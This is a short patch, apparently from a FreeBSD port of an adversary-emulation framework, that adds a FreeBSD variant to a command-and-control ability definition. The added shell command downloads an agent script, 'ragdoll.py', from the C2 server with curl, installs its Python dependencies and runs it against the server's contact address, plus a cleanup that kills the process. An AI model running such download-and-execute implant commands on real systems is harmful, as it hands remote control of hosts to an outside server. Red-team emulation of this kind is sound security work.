@@ -1,0 +1,15 @@
+--- plugins/stockpile/data/abilities/command-and-control/0ab383be-b819-41bf-91b9-1bd4404d83bf.yml.orig	2022-09-14 02:24:22 UTC
++++ plugins/stockpile/data/abilities/command-and-control/0ab383be-b819-41bf-91b9-1bd4404d83bf.yml
+@@ -24,3 +24,12 @@
+           python ragdoll.py -W $server#{app.contact.html}
+         cleanup: |
+           pkill -f ragdoll
++    freebsd:
++      sh:
++        command: |
++          server="#{app.contact.http}";
++          curl -s -X POST -H "file:ragdoll.py" -H "platform:freebsd" $server/file/download > ragdoll.py;
++          pip install requests beautifulsoup4;
++          python ragdoll.py -W $server#{app.contact.html}
++        cleanup: |
++          pkill -f ragdoll
